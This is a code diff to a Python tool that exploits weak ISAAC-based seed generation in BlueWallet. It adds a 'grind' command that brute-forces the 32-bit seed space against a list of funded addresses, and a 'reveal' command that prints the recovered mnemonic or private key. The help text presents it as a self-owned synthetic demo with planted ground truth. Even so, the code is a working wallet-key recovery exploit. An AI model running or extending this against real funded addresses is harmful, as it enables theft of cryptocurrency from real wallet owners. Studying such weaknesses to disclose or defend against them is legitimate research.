@@ -19,12 +19,16 @@ import argparse
 import random
 import sys
 
+import json
+import os
+
 from bluewallet_isaac import (
     bluewallet_v3_entropy_hex,
     create_hd_wallet,
     create_singlekey_wallet,
 )
 from bluewallet_isaac import attack
+from bluewallet_isaac import grind as grind_mod
 
 GOLDEN = {
     "seed1_hd_entropy": "2132c5907cbc79a7787eee988a67ef7342d7e4b4083faba7e1e468c92b4b0aa2",
@@ -139,6 +143,66 @@ def cmd_benchmark(args: argparse.Namespace) -> int:
     return 0
 
 
+def cmd_grind(args: argparse.Namespace) -> int:
+    funded = grind_mod.load_funded_set(args.funded)
+    kinds = tuple(args.kinds.split(","))
+    print("Full-space grind: intersect the ISAAC CREATE space with a funded set.\n")
+    print(f"  funded set        : {args.funded}  ({len(funded):,} addresses)")
+    print(f"  seed range        : [{args.start}, {args.end})")
+    print(f"  kinds / gaps      : {kinds} / {args.gaps}")
+    print(f"  workers           : {args.workers}\n")
+
+    def progress(next_seed: int, secs: float, nhits: int) -> None:
+        rate = next_seed / secs if secs else 0
+        sys.stdout.write(f"\r  scanned up to seed={next_seed:>10}  hits={nhits}  rate={rate:,.0f}/s")
+        sys.stdout.flush()
+
+    report = grind_mod.grind(
+        funded,
+        start=args.start,
+        end=args.end,
+        kinds=kinds,
+        gaps=args.gaps,
+        workers=args.workers,
+        chunk=args.chunk,
+        out_dir=args.out_dir,
+        resume=args.resume,
+        progress_cb=progress,
+    )
+    print()
+    print(f"\n  scanned {report.scanned:,} seeds in {report.seconds:.2f}s "
+          f"({report.rate:,.0f} seeds/s)")
+    print(f"  HITS: {len(report.hits)}")
+    for h in report.hits:
+        print(f"    seed={h.seed}  {h.kind}  {h.address}")
+
+    if report.hits and args.reveal:
+        print("\n  Reveal (self-owned synthetic hits — full compromise):")
+        for h in report.hits:
+            info = grind_mod.reveal_hit(h.seed, h.kind)
+            secret = info.get("mnemonic") or info.get("wif")
+            print(f"    seed={h.seed}  {h.kind}  {h.address}")
+            print(f"      secret: {secret}")
+
+    if args.expect_planted and os.path.exists(args.expect_planted):
+        with open(args.expect_planted, "r", encoding="utf-8") as fh:
+            truth = json.load(fh)
+        planted = {g["seed"] for g in truth["planted"]}
+        found = {h.seed for h in report.hits}
+        missing = planted - found
+        print(f"\n  planted seeds     : {sorted(planted)}")
+        print(f"  recovered seeds   : {sorted(found)}")
+        print(f"  RESULT: {'ALL PLANTED WALLETS LOCATED' if not missing else f'MISSING {sorted(missing)}'}")
+        return 0 if not missing else 1
+    return 0
+
+
+def cmd_reveal(args: argparse.Namespace) -> int:
+    info = grind_mod.reveal_hit(args.seed, args.kind)
+    print(json.dumps(info, indent=2))
+    return 0
+
+
 def main(argv=None) -> int:
     p = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
     sub = p.add_subparsers(dest="command", required=True)
@@ -167,6 +231,28 @@ def main(argv=None) -> int:
     sp.add_argument("--seeds", type=int, default=5000)
     sp.add_argument("--gaps", type=int, default=1)
     sp.set_defaults(func=cmd_benchmark)
+
+    sp = sub.add_parser("grind", help="intersect the seed space with a funded set")
+    sp.add_argument("--funded", required=True, help="funded-address file (one per line)")
+    sp.add_argument("--start", type=int, default=0)
+    sp.add_argument("--end", type=int, default=300000,
+                    help="exclusive upper seed bound (default demo range; use 4294967296 for full 2**32)")
+    sp.add_argument("--kinds", default=f"{attack.KIND_BIP49},{attack.KIND_SEGWIT_P2SH}",
+                    help="comma-separated address kinds")
+    sp.add_argument("--gaps", type=int, default=2)
+    sp.add_argument("--workers", type=int, default=1)
+    sp.add_argument("--chunk", type=int, default=50000)
+    sp.add_argument("--out-dir", default=None, help="checkpoint/hits directory (enables resume)")
+    sp.add_argument("--resume", action="store_true")
+    sp.add_argument("--reveal", action="store_true", help="reveal secrets for hits (self-owned demo only)")
+    sp.add_argument("--expect-planted", default=None,
+                    help="synthetic ground-truth JSON to verify all planted wallets were located")
+    sp.set_defaults(func=cmd_grind)
+
+    sp = sub.add_parser("reveal", help="reconstruct the secret for a (seed, kind) hit")
+    sp.add_argument("seed", type=int)
+    sp.add_argument("--kind", default="segwit_p2sh:0")
+    sp.set_defaults(func=cmd_reveal)
 
     args = p.parse_args(argv)
     return args.func(args)
